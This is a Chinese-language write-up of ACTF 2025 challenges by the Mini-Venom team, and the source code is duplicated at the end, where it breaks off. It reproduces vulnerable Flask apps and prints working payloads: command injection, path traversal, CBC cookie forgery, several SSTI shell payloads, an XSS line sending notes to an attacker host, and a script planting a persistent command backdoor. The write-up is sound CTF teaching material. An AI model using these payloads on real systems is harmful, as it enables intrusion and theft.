# ACTF 2025 writeup by Mini-Venom

> 原文: https://www.ctfiot.com/243984.html
> ID: 243984

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱 admin@chamd5.org(带上简历和想加入的小组)

Web:

ACTF upload

随便登录就是普通用户，进去可以上传文件，任意文件读取upload?file_path=../../../../app/app.py得到源码

import uuid
import os
import hashlib
import base64
from flask import Flask, request, redirect, url_for, flash, session

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY')

@app.route('/')
def index():
    if session.get('username'):
        return redirect(url_for('upload'))
    else:
        return redirect(url_for('login'))

@app.route('/login', methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == 'admin':
            if hashlib.sha256(password.encode()).hexdigest() == '32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0':
                session['username'] = username
                return redirect(url_for('index'))
            else:
                flash('Invalid password')
        else:
            session['username'] = username
            return redirect(url_for('index'))
    else:
        return'''
        <h1>Login</h1>
        <h2>No need to register.</h2>
        <form action="/login" method="post">
            <label for="username">Username:</label>
            
            

            <label for="password">Password:</label>
            
            

            
        </form>
        '''

@app.route('/upload', methods=['POST', 'GET'])
def upload():
    ifnot session.get('username'):
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        f = request.files['file']
        file_path = str(uuid.uuid4()) + '_' + f.filename
        f.save('./uploads/' + file_path)
        return redirect(f'/upload?file_path={file_path}')
    
    else:
        ifnot request.args.get('file_path'):
            return'''
            <h1>Upload Image</h1>
            
            <form action="/upload" method="post" enctype="multipart/form-data">
                
                
            </form>
            '''
            
        else:
            file_path = './uploads/' + request.args.get('file_path')
            if session.get('username') != 'admin':
                with open(file_path, 'rb') as f:
                    content = f.read()
                    b64 = base64.b64encode(content)
                    returnf''
            else:
                os.system(f'base64 {file_path} > /tmp/{file_path}.b64')
                # with open(f'/tmp/{file_path}.b64', 'r') as f:
                #     return f''
                return'Sorry, but you are not allowed to view this image.'
                
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

可以看到upload路由这里如果是admin的话会执行os.system(f'base64 {file_path} > /tmp/{file_path}.b64')，存在命令注入,admin的密码解出是backdoor

那么就可以先登录admin通过命令注入获取flag名称/Fl4g_is_H3r3，再通过任意文件读取去读flag

file_path=; ls / > /tmp/aaa #
file_path=../../../../Fl4g_is_H3r3

not so web 1

import base64, json, time
import os, sys, binascii
from dataclasses import dataclass, asdict
from typing import Dict, Tuple
from secret import KEY, ADMIN_PASSWORD
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from flask import (
    Flask,
    render_template,
    render_template_string,
    request,
    redirect,
    url_for,
    flash,
    session,
)

app = Flask(__name__)
app.secret_key = KEY

@dataclass(kw_only=True)
class APPUser:
    name: str
    password_raw: str
    register_time: int

#  In-memory store for user registration
users: Dict[str, APPUser] = {
    "admin": APPUser(name="admin", password_raw=ADMIN_PASSWORD, register_time=-1)
}

def validate_cookie(cookie: str) -> bool:
    ifnot cookie:
        returnFalse

    try:
        cookie_encrypted = base64.b64decode(cookie, validate=True)
    
except binascii.Error:
        returnFalse

    if len(cookie_encrypted) < 32:
        returnFalse

    try:
        iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        cookie_json = cipher.decrypt(padded)
    
except ValueError:
        returnFalse

    try:
        _ = json.loads(cookie_json)
    
except Exception:
        returnFalse

    returnTrue

def parse_cookie(cookie: str) -> Tuple[bool, str]:
    ifnot cookie:
        returnFalse, ""

    try:
        cookie_encrypted = base64.b64decode(cookie, validate=True)
    
except binascii.Error:
        returnFalse, ""

    if len(cookie_encrypted) < 32:
        returnFalse, ""

    try:
        iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(padded)
        cookie_json_bytes = unpad(decrypted, 16)
        cookie_json = cookie_json_bytes.decode()
    
except ValueError:
        returnFalse, ""

    try:
        cookie_dict = json.loads(cookie_json)
    
except Exception:
        returnFalse, ""

    returnTrue, cookie_dict.get("name")

def generate_cookie(user: APPUser) -> str:
    cookie_dict = asdict(user)
    cookie_json = json.dumps(cookie_dict)
    cookie_json_bytes = cookie_json.encode()
    iv = os.urandom(16)
    padded = pad(cookie_json_bytes, 16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(iv + encrypted).decode()

@app.route("/")
def index():
    if validate_cookie(request.cookies.get("jwbcookie")):
        return redirect(url_for("home"))
    return redirect(url_for("login"))

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        user_name = request.form["username"]
        password = request.form["password"]
        if user_name in users:
            flash("Username already exists!", "danger")
        else:
            users[user_name] = APPUser(
                name=user_name, password_raw=password, register_time=int(time.time())
            )
            flash("Registration successful! Please login.", "success")
            return redirect(url_for("login"))
    return render_template("register.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        if username in users and users[username].password_raw == password:
            resp = redirect(url_for("home"))
            resp.set_cookie("jwbcookie", generate_cookie(users[username]))
            return resp
        else:
            flash("Invalid credentials. Please try again.", "danger")
    return render_template("login.html")

@app.route("/home")
def home():
    valid, current_username = parse_cookie(request.cookies.get("jwbcookie"))
    ifnot valid ornot current_username:
        return redirect(url_for("logout"))

    user_profile = users.get(current_username)
    ifnot user_profile:
        return redirect(url_for("logout"))

    if current_username == "admin":
        payload = request.args.get("payload")
        html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>

    
        <h2 class="text-center">Welcome, %s !</h2>
        
            Your payload: %s
        
        
        
            [Logout](/logout)
        
    

</html>
""" % (
            current_username,
            payload,
        )
    else:
        html_template = (
            """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>

    
        <h2 class="text-center">server code (encoded)</h2>
        
        {%% raw %%}
            %s
        {%% endraw %%}
        
        
            [Logout](/logout)
        
    

</html>
"""
            % base64.b64encode(open(__file__, "rb").read()).decode()
        )
    return render_template_string(html_template)

@app.route("/logout")
def logout():
    resp = redirect(url_for("login"))
    resp.delete_cookie("jwbcookie")
    return resp

if __name__ == "__main__":
    app.run()

CBC字节翻转攻击伪造admin打SSTI就行

首先我们注册的用户对象json格式为

{"name": "admix", "password_raw": "password123", "register_time": 1714100000}

返回给我们的cookie格式为base64(IV + AES(User)) ，可知道我们需要反转的m在User Json格式的第一个AES分组的第15位，根据CBC的特性可知，第一组明文在加密前需要与IV进行异或，那么我们直接翻转IV即可，同时不用考虑翻转后的扩散影响

import base64

ciphertext = 'pcs0XLPoE/wf64KE3YYV6lqC8s7SM/sFaFTE+Ap373D2nEWbaLEYgGGzhFKfXeeuxO/uZKY5cRm75DWqY3O7bFysO8ke5XZtzt7J1l0BlDwCJvxzh+TP3s7rx9jVYmqw'

cipher = base64.b64decode(ciphertext)
iv = bytearray(cipher[:16])
cipher = cipher[16:]
iv[14] = iv[14] ^ ord('x') ^ ord('n')
new_cookie = base64.b64encode(bytes(iv) + cipher).decode()
print('Cipher:', new_cookie)

# pcs0XLPoE/wf64KE3YYD6lqC8s7SM/sFaFTE+Ap373D2nEWbaLEYgGGzhFKfXeeuxO/uZKY5cRm75DWqY3O7bFysO8ke5XZtzt7J1l0BlDwCJvxzh+TP3s7rx9jVYmqw

{{g.pop.__globals__.__builtins__['__import__']('os').popen('cat flag.txt').read()}}

not so web 2

import base64, json, time
import os, sys, binascii
from dataclasses import dataclass, asdict
from typing import Dict, Tuple
from secret import KEY, ADMIN_PASSWORD
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_v1_5
from Crypto.Hash import SHA256
from flask import (
    Flask,
    render_template,
    render_template_string,
    request,
    redirect,
    url_for,
    flash,
    session,
    abort,
)

app = Flask(__name__)
app.secret_key = KEY

if os.path.exists("/etc/ssl/nginx/local.key"):
    private_key = RSA.importKey(open("/etc/ssl/nginx/local.key", "r").read())
else:
    private_key = RSA.generate(2048)

public_key = private_key.publickey()

@dataclass
class APPUser:
    name: str
    password_raw: str
    register_time: int

#  In-memory store for user registration
users: Dict[str, APPUser] = {
    "admin": APPUser(name="admin", password_raw=ADMIN_PASSWORD, register_time=-1)
}

def validate_cookie(cookie_b64: str) -> bool:
    valid, _ = parse_cookie(cookie_b64)
    return valid

def parse_cookie(cookie_b64: str) -> Tuple[bool, str]:
    ifnot cookie_b64:
        returnFalse, ""

    try:
        cookie = base64.b64decode(cookie_b64, validate=True).decode()
    
except binascii.Error:
        returnFalse, ""

    try:
        msg_str, sig_hex = cookie.split("&")
    
except Exception:
        returnFalse, ""

    msg_dict = json.loads(msg_str)
    msg_str_bytes = msg_str.encode()
    msg_hash = SHA256.new(msg_str_bytes)
    sig = bytes.fromhex(sig_hex)
    try:
        PKCS1_v1_5.new(public_key).verify(msg_hash, sig)
        valid = True
    
except (ValueError, TypeError):
        valid = False
    return valid, msg_dict.get("user_name")

def generate_cookie(user: APPUser) -> str:
    msg_dict = {"user_name": user.name, "login_time": int(time.time())}
    msg_str = json.dumps(msg_dict)
    msg_str_bytes = msg_str.encode()
    msg_hash = SHA256.new(msg_str_bytes)
    sig = PKCS1_v1_5.new(private_key).sign(msg_hash)
    sig_hex = sig.hex()
    packed = msg_str + "&" + sig_hex
    return base64.b64encode(packed.encode()).decode()

@app.route("/")
def index():
    if validate_cookie(request.cookies.get("jwbcookie")):
        return redirect(url_for("home"))
    return redirect(url_for("login"))

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        user_name = request.form["username"]
        password = request.form["password"]
        if user_name in users:
            flash("Username already exists!", "danger")
        else:
            users[user_name] = APPUser(
                name=user_name, password_raw=password, register_time=int(time.time())
            )
            flash("Registration successful! Please login.", "success")
            return redirect(url_for("login"))
    return render_template("register.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        if username in users and users[username].password_raw == password:
            resp = redirect(url_for("home"))
            resp.set_cookie("jwbcookie", generate_cookie(users[username]))
            return resp
        else:
            flash("Invalid credentials. Please try again.", "danger")
    return render_template("login.html")

@app.route("/home")
def home():
    valid, current_username = parse_cookie(request.cookies.get("jwbcookie"))
    ifnot valid ornot current_username:
        return redirect(url_for("logout"))

    user_profile = users.get(current_username)
    ifnot user_profile:
        return redirect(url_for("logout"))

    if current_username == "admin":
        payload = request.args.get("payload")
        if payload:
            for char in payload:
                if char in"'_#&;":
                    abort(403)
                    return

        html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>

    
        <h2 class="text-center">Welcome, %s !</h2>
        
            Your payload: %s
        
        
        
            [Logout](/logout)
        
    

</html>
""" % (
            current_username,
            payload,
        )
    else:
        html_template = (
            """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>

    
        <h2 class="text-center">server code (encoded)</h2>
        
        {%% raw %%}
            %s
        {%% endraw %%}
        
        
            [Logout](/logout)
        
    

</html>
"""
            % base64.b64encode(open(__file__, "rb").read()).decode()
        )
    return render_template_string(html_template)

@app.route("/logout")
def logout():
    resp = redirect(url_for("login"))
    resp.delete_cookie("jwbcookie")
    return resp

if __name__ == "__main__":
    app.run()

鉴权存在问题

if current_username == "admin":
        payload = request.args.get("payload")

base64解码后的username是admin就行

base_str = "eyJ1c2VyX25hbWUiOiAiYWRtaXgiLCAibG9naW5fdGltZSI6IDE3NDU2NTYxMjF9JjRlOGViNjZjNTNlN2E2YzQzYTY4MjNhZGQ0MjQwMzA0YjBlZjVhM2VmZTk5MzRjNWQ1ZTg1MGQ5NWRkN2M1M2Y4NTRmOGU0NjljYTQzYTM1Y2M3YTRhZGNhYWQwNDI0Nzc0NGY3Mjk3YjdjNjY3MjJhYTg2ODQ1YjQxYzUxYzliMjMzNjllNjFmYjE0ZWRhNjE4ODIxZDM3NzAyODA0ZmY2ZWI0M2U5ZjQzZmMwNTE0NzBjYWJkMTU4MTM0MmRmNzc1NGZjNDUzMDMyZWU2ZDgxOTRiNmM1NjNmNmRhNjBiN2RlMDExODc2ZTcxZWEyMGIyNjhkZDBlMWVlYTg0Yjk3MTcyNjI4NzA1ODk3NDYyNTI2Njk1NGQxZmY1OTc3MWM2Y2MwZjY5NzIzNDY2OWVkZWJlNDk2NmQ0OWVjN2E0NjgyZGE5NDI2MWI2ODYyZWU1ZDlmNjU4NDQ3NWMzY2U2YzdiMmZiNmE0YjM5Mzg4NzIyMDc1YjFlMmQ1MjA4MWFjYjBlY2JjYjk1YzlmOWI1MGU4ZmI0Zjk2NDA3MmIyM2E4NjBlMTRkNTE5OGYyNjJmYjVjOWZkZDZhNzYxYTQ2YWVlNTJlMDkzYTM0MGFiOTgzZGQ3MjU1N2I2YWEyYmYxMTM0N2NhN2Y3ZWQ0ZDQ3YTJiYjg1NDAzMmIzNzZi"
origin = base64.b64decode(base_str)
print(origin)

# b'{"user_name": "admix", "login_time": 1745656121}&4e8eb66c53e7a6c43a6823add4240304b0ef5a3efe9934c5d5e850d95dd7c53f854f8e469ca43a35cc7a4adcaad04247744f7297b7c66722aa86845b41c51c9b23369e61fb14eda618821d37702804ff6eb43e9f43fc051470cabd1581342df7754fc453032ee6d8194b6c563f6da60b7de011876e71ea20b268dd0e1eea84b971726287058974625266954d1ff59771c6cc0f697234669edebe4966d49ec7a4682da94261b6862ee5d9f6584475c3ce6c7b2fb6a4b39388722075b1e2d52081acb0ecbcb95c9f9b50e8fb4f964072b23a860e14d5198f262fb5c9fdd6a761a46aee52e093a340ab983dd72557b6aa2bf11347ca7f7ed4d47a2bb854032b376b'
signature = '{"user_name": "admin", "login_time": 1745656121}&4e8eb66c53e7a6c43a6823add4240304b0ef5a3efe9934c5d5e850d95dd7c53f854f8e469ca43a35cc7a4adcaad04247744f7297b7c66722aa86845b41c51c9b23369e61fb14eda618821d37702804ff6eb43e9f43fc051470cabd1581342df7754fc453032ee6d8194b6c563f6da60b7de011876e71ea20b268dd0e1eea84b971726287058974625266954d1ff59771c6cc0f697234669edebe4966d49ec7a4682da94261b6862ee5d9f6584475c3ce6c7b2fb6a4b39388722075b1e2d52081acb0ecbcb95c9f9b50e8fb4f964072b23a860e14d5198f262fb5c9fdd6a761a46aee52e093a340ab983dd72557b6aa2bf11347ca7f7ed4d47a2bb854032b376b'
print(base64.b64encode(signature.encode()))

然后还是打SSTI

{%set ia=lipsum|escape|batch(22)|first|last%}{%set gl=ia*2+"globals"+ia*2%}{%set bu=ia*2+"builtins"+ia*2%}{%set im=ia*2+"import"+ia*2%}{{g.pop[gl][bu][im]("os").popen("cat f*").read()}}

EZ-NOTE

注意pandoc

如果未明确指定输入或输出格式，pandoc将尝试根据文件名的扩展名进行猜测。例如，
pandoc -o hello.tex hello.txt
将从 Markdown 转换hello.txt为 LaTeX。如果未指定输出文件（即输出到stdout），或者输出文件的扩展名未知，则输出格式将默认为 HTML。如果未指定输入文件（即输入来自stdin），或者输入文件的扩展名未知，则输入格式将被假定为 Markdown。

感觉有可能是塞进Map的时候会自动把一些字节删了

u0000

The scene has expired, please re found it？ 攻防世界平台出问题了
凑活用吧先：

http://36.134.115.149:
3000/

title=a&format=rst&content=..+include%3a%3a+/etc/passwd可以读文件，但是flag.txt被删了

这样的话临时文件名8位，可以report一下再爆破8位？

app.post('/report', async (req, res) => {
    let { url } = req.body
    try {
        await visit(url)
        res.send('success')
    } catch (err) {
        console.log(err)
        res.send('error')
    }
}

/report路由这里未对url进行处理，url会直接传入bot.js的visit

async function visit(url) {
    let browser = await puppeteer.launch({
        headless: HEADLESS,
        executablePath: '/usr/bin/chromium',
        args: ['--no-sandbox'],
    })
    let page = await browser.newPage()

    await page.goto('http://localhost:
3000/')

    await page.waitForSelector('#title')
    await page.type('#title', 'flag', {delay: 100})
    await page.type('#content', FLAG, {delay: 100})
    await page.click('#submit', {delay: 100})

    await sleep(3)
    console.log('visiting %s', url)

    await page.goto(url)
    await sleep(30)
    await browser.close()
}

通过js伪协议打XSS将nots外带，然后获取note/:
noteId中的flag

javascript:
fetch('/notes').then(r=>r.text()).then(d=>navigator.sendBeacon('http://ip:
port/',d))

注：这题真有够逆天的2333，samesite居然默认是None。出题人也不验题）

Excellent-Site

mail injection+sql injection+SSTI

import requests
import time
url = "http://223.112.5.141:
56309"

evil = 'FROM "admin@ezmail.org"'

def report():
    content = """{{url_for.__globals__.__builtins__["eval"]("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(\"cmd\") and exec(\"global CmdResp;CmdResp=__import__('flask').make_response(__import__('os').popen(request.args.get('cmd')).read())\")==None else resp)",{"request":
url_for.__globals__["request"],"app":g.pop.__globals__.sys.modules["__main__"].app})}}""".replace("'","''")
    subject="http://ezmail.org:
3000/news?id=0 union select '"+content+"'"
    data = {
        # "url": 'http://ezmail.org:
3000/rnrn1234rn.rn'+f'From: admin@ezmail.orgrnTo: admin@ezmail.orgrnSubject: {subject}',
        "url": subject+"rnFrom: admin@ezmail.org",
        "content": "1234"
    }

    r = requests.post(url+"/report", data=data)
    print(r.text)
report()
requests.get(url+"/bot")

req = requests.get(url+"/?cmd=cat /flag")
print(f"flag:{req.text}")

Misc:

master of movie

题目要求找到下面15个影视作品的IMDb号

提交数据，easy应该是对的，hard可能有错误

点击图片可查看完整电子表格

Easy的基本可以用谷歌识图，trace.moe得到结果

Hard，前两个可能不确定，使用ChatGPT识别的

hard_2:
Pokssak Sogatsuda，抖音识图

hard_3:
Awaara, 观察图片似乎有穆斯林的帽子，推测是印度电影

hard_4:
Psiconautas, los niños olvidados，谷歌识图，蜘蛛是其中的角色

QQQRcode

题目给了个脚本，主要

这段程序要求先通过一个PoW挑战（sha256前缀爆破）。

然后输入一个长达9261位的二进制串，表示一个21×21×21的立体矩阵，其中1（黑块）个数需要在390个以内。

程序从三维矩阵中生成三个二维投影图像，每张图解码出的二维码内容必须分别是 "Azure"、"Assassin"、"Alliance"。

如果全部验证通过，就会输出本地 flag 文件内容。

Don't set SSH username as "KatoMegumi" (it's too predictable!). —->猜测SSH连接用户名为KatoMegumi

Don't use name+birthday combinations for passwords, like "Megumi19960923" or … I guess. —->猜测SSH登录密码在Megumi19960923的组合之中

具有SUID位的程序

同时传入-p选项

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
import uuid
import os
import hashlib
import base64
from flask import Flask, request, redirect, url_for, flash, session

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY')

@app.route('/')
def index():
    if session.get('username'):
        return redirect(url_for('upload'))
    else:
        return redirect(url_for('login'))

@app.route('/login', methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == 'admin':
            if hashlib.sha256(password.encode()).hexdigest() == '32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0':
                session['username'] = username
                return redirect(url_for('index'))
            else:
                flash('Invalid password')
        else:
            session['username'] = username
            return redirect(url_for('index'))
    else:
        return'''
        <h1>Login</h1>
        <h2>No need to register.</h2>
        <form action="/login" method="post">
            <label for="username">Username:</label>
            
            

            <label for="password">Password:</label>
            
            

            
        </form>
        '''

@app.route('/upload', methods=['POST', 'GET'])
def upload():
    ifnot session.get('username'):
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        f = request.files['file']
        file_path = str(uuid.uuid4()) + '_' + f.filename
        f.save('./uploads/' + file_path)
        return redirect(f'/upload?file_path={file_path}')
    
    else:
        ifnot request.args.get('file_path'):
            return'''
            <h1>Upload Image</h1>
            
            <form action="/upload" method="post" enctype="multipart/form-data">
                
                
            </form>
            '''
            
        else:
            file_path = './uploads/' + request.args.get('file_path')
            if session.get('username') != 'admin':
                with open(file_path, 'rb') as f:
                    content = f.read()
                    b64 = base64.b64encode(content)
                    returnf''
            else:
                os.system(f'base64 {file_path} > /tmp/{file_path}.b64')
                # with open(f'/tmp/{file_path}.b64', 'r') as f:
                #     return f''
                return'Sorry, but you are not allowed to view this image.'
                
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
file_path=; ls / > /tmp/aaa #
file_path=../../../../Fl4g_is_H3r3
import base64, json, time
import os, sys, binascii
from dataclasses import dataclass, asdict
from typing import Dict, Tuple
from secret import KEY, ADMIN_PASSWORD
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from flask import (
    Flask,
    render_template,
    render_template_string,
    request,
    redirect,
    url_for,
    flash,
    session,
)

app = Flask(__name__)
app.secret_key = KEY

@dataclass(kw_only=True)
class APPUser:
    name: str
    password_raw: str
    register_time: int

#  In-memory store for user registration
users: Dict[str, APPUser] = {
    "admin": APPUser(name="admin", password_raw=ADMIN_PASSWORD, register_time=-1)
}

def validate_cookie(cookie: str) -> bool:
    ifnot cookie:
        returnFalse

    try:
        cookie_encrypted = base64.b64decode(cookie, validate=True)
    
except binascii.Error:
        returnFalse

    if len(cookie_encrypted) < 32:
        returnFalse

    try:
        iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        cookie_json = cipher.decrypt(padded)
    
except ValueError:
        returnFalse

    try:
        _ = json.loads(cookie_json)
    
except Exception:
        returnFalse

    returnTrue

def parse_cookie(cookie: str) -> Tuple[bool, str]:
    ifnot cookie:
        returnFalse, ""

    try:
        cookie_encrypted = base64.b64decode(cookie, validate=True)
    
except binascii.Error:
        returnFalse, ""

    if len(cookie_encrypted) < 32:
        returnFalse, ""

    try:
        iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(padded)
        cookie_json_bytes = unpad(decrypted, 16)
        cookie_json = cookie_json_bytes.decode()
    
except ValueError:
        returnFalse, ""

    try:
        cookie_dict = json.loads(cookie_json)
    
except Exception:
        returnFalse, ""

    returnTrue, cookie_dict.get("name")

def generate_cookie(user: APPUser) -> str:
    cookie_dict = asdict(user)
    cookie_json = json.dumps(cookie_dict)
    cookie_json_bytes = cookie_json.encode()
    iv = os.urandom(16)
    padded = pad(cookie_json_bytes, 16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(iv + encrypted).decode()

@app.route("/")
def index():
    if validate_cookie(request.cookies.get("jwbcookie")):
        return redirect(url_for("home"))
    return redirect(url_for("login"))

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        user_name = request.form["username"]
        password = request.form["password"]
        if user_name in users:
            flash("Username already exists!", "danger")
        else:
            users[user_name] = APPUser(
                name=user_name, password_raw=password, register_time=int(time.time())
            )
            flash("Registration successful! Please login.", "success")
            return redirect(url_for("login"))
    return render_template("register.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        if username in users and users[username].password_raw == password:
            resp = redirect(url_for("home"))
            resp.set_cookie("jwbcookie", generate_cookie(users[username]))
            return resp
        else:
            flash("Invalid credentials. Please try again.", "danger")
    return render_template("login.html")

@app.route("/home")
def home():
    valid, current_username = parse_cookie(request.cookies.get("jwbcookie"))
    ifnot valid ornot current_username:
        return redirect(url_for("logout"))

    user_profile = users.get(current_username)
    ifnot user_profile:
        return redirect(url_for("logout"))

    if current_username == "admin":
        payload = request.args.get("payload")
        html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>

    
        <h2 class="text-center">Welcome, %s !</h2>
        
            Your payload: %s
        
        
        
            [Logout](/logout)
        
    

</html>
""" % (
            current_username,
            payload,
        )
    else:
        html_template = (
            """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>

    
        <h2 class="text-center">server code (encoded)</h2>
        
        {%% raw %%}
            %s
        {%% endraw %%}
        
        
            [Logout](/logout)
        
    

</html>
"""
            % base64.b64encode(open(__file__, "rb").read()).decode()
        )
    return render_template_string(html_template)

@app.route("/logout")
def logout():
    resp = redirect(url_for("login"))
    resp.delete_cookie("jwbcookie")
    return resp

if __name__ == "__main__":
    app.run()
{"name": "admix", "password_raw": "password123", "register_time": 1714100000}
import base64

ciphertext = 'pcs0XLPoE/wf64KE3YYV6lqC8s7SM/sFaFTE+Ap373D2nEWbaLEYgGGzhFKfXeeuxO/uZKY5cRm75DWqY3O7bFysO8ke5XZtzt7J1l0BlDwCJvxzh+TP3s7rx9jVYmqw'

cipher = base64.b64decode(ciphertext)
iv = bytearray(cipher[:16])
cipher = cipher[16:]
iv[14] = iv[14] ^ ord('x') ^ ord('n')
new_cookie = base64.b64encode(bytes(iv) + cipher).decode()
print('Cipher:', new_cookie)

# pcs0XLPoE/wf64KE3YYD6lqC8s7SM/sFaFTE+Ap373D2nEWbaLEYgGGzhFKfXeeuxO/uZKY5cRm75DWqY3O7bFysO8ke5XZtzt7J1l0BlDwCJvxzh+TP3s7rx9jVYmqw
{{g.pop.__globals__.__builtins__['__import__']('os').popen('cat flag.txt').read()}}
import base64, json, time
import os, sys, binascii
from dataclasses import dataclass, asdict
from typing import Dict, Tuple
from secret import KEY, ADMIN_PASSWORD
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_v1_5
from Crypto.Hash import SHA256
from flask import (
    Flask,
    render_template,
    render_template_string,
    request,
    redirect,
    url_for,
    flash,
    session,
    abort,
)

app = Flask(__name__)
app.secret_key = KEY

if os.path.exists("/etc/ssl/nginx/local.key"):
    private_key = RSA.importKey(open("/etc/ssl/nginx/local.key", "r").read())
else:
    private_key = RSA.generate(2048)

public_key = private_key.publickey()

@dataclass
class APPUser:
    name: str
    password_raw: str
    register_time: int

#  In-memory store for user registration
users: Dict[str, APPUser] = {
    "admin": APPUser(name="admin", password_raw=ADMIN_PASSWORD, register_time=-1)
}

def validate_cookie(cookie_b64: str) -> bool:
    valid, _ = parse_cookie(cookie_b64)
    return valid

def parse_cookie(cookie_b64: str) -> Tuple[bool, str]:
    ifnot cookie_b64:
        returnFalse, ""

    try:
        cookie = base64.b64decode(cookie_b64, validate=True).decode()
    
except binascii.Error:
        returnFalse, ""

    try:
        msg_str, sig_hex = cookie.split("&")
    
except Exception:
        returnFalse, ""

    msg_dict = json.loads(msg_str)
    msg_str_bytes = msg_str.encode()
    msg_hash = SHA256.new(msg_str_bytes)
    sig = bytes.fromhex(sig_hex)
    try:
        PKCS1_v1_5.new(public_key).verify(msg_hash, sig)
        valid = True
    
except (ValueError, TypeError):
        valid = False
    return valid, msg_dict.get("user_name")

def generate_cookie(user: APPUser) -> str:
    msg_dict = {"user_name": user.name, "login_time": int(time.time())}
    msg_str = json.dumps(msg_dict)
    msg_str_bytes = msg_str.encode()
    msg_hash = SHA256.new(msg_str_bytes)
    sig = PKCS1_v1_5.new(private_key).sign(msg_hash)
    sig_hex = sig.hex()
    packed = msg_str + "&" + sig_hex
    return base64.b64encode(packed.encode()).decode()

@app.route("/")
def index():
    if validate_cookie(request.cookies.get("jwbcookie")):
        return redirect(url_for("home"))
    return redirect(url_for("login"))

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        user_name = request.form["username"]
        password = request.form["password"]
        if user_name in users:
            flash("Username already exists!", "danger")
        else:
            users[user_name] = APPUser(
                name=user_name, password_raw=password, register_time=int(time.time())
            )
            flash("Registration successful! Please login.", "success")
            return redirect(url_for("login"))
    return render_template("register.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        if username in users and users[username].password_raw == password:
            resp = redirect(url_for("home"))
            resp.set_cookie("jwbcookie", generate_cookie(users[username]))
            return resp
        else:
            flash("Invalid credentials. Please try again.", "danger")
    return render_template("login.html")

@app.route("/home")
def home():
    valid, current_username = parse_cookie(request.cookies.get("jwbcookie"))
    ifnot valid ornot current_username:
        return redirect(url_for("logout"))

    user_profile = users.get(current_username)
    ifnot user_profile:
